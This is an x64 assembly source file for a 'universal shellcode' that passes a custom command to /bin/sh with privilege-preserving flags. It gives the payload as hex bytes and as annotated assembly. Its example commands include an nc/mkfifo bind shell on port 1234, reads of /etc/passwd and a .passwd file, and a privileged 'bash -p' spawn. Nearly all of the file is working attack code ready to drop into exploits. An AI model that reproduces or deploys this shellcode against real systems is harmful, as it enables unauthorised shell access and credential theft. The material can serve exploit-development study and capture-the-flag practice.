	#	Assembly code to invoke a custom command (x64)	#
	#	a.k.a. "Universal shellcode"			#
	#	(by Daniel Henry-Mantilla)			#

# char shellcode[] =
#  "\x6a\x63\x66\x68\x2d\x70\x48\x89\xe3\x6a\x3b\x58\x48\x99\x52\xeb\x25\x48\x8b\x3c\x24\xff\xc7\x80\x3f\x23\x75\xf9\x88\x17\x53\x48\x8d\x7c\x24\xe8\x57\x48\x89\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x0f\x05\xe8\xd6\xff\xff\xff"\
#  "custom_cmd"\
#  "#"; // Terminator (required /!\)

# custom_cmd examples:
# 1: "echo 'Shell spawned successfully!' && bash -p"\
# 2: "rm -f /tmp/f && mkfifo /tmp/f && cat /tmp/f | /bin/sh -p -i 2>&1 | nc -lp 1234 > /tmp/f; rm -f /tmp/f"\
# 3: "cat .passwd"\
# 4: "cat /etc/passwd && /etc/shallow"\

# Total length of the shellcode = 60 + custom_cmd_length
# Since 60 = 59 (prefix_length) + 1 (terminating char)

	.set END, 0x23		# terminating char (e.g, '#')

.text
.globl _start
_start:
	push $0x63		# "c"
	pushw $0x702d		# '-p'
	mov %rsp, %rbx		# address of "-pc"

	push $59		# sys_execve
	pop %rax

	cqo			# env = NULL
	push %rdx		# argv[3] = NULL

	jmp cmd
	back:
	mov (%rsp), %rdi	# argv[2] = address of custom cmd

#	jmp test		# Uncomment to handle empty commands
	loop:
	inc %edi		# Same as inc %rdi 99.9999% of the time
	test:
	cmpb $END, (%rdi)
	jne loop
	movb %dl, (%rdi)	# Custom cmd is now '\0'-terminated

	push %rbx		# argv[1] = address of "-pc"

	lea -0x18(%rsp), %rdi	# rdi = address of "/bin/sh"
	push %rdi		# argv[0] = rdi
	mov %rsp, %rsi		# argv

	push %rdx		# "" (null-terminator)
	mov $0x68732f2f6e69622f, %rbx
	push %rbx		# '/bin//sh'

	syscall

cmd:
	call back
	# Custom command here #
	.ascii "echo 'Shell spawned successfully!' && bash -p"
	.ascii "#"		# /!\ String terminator #


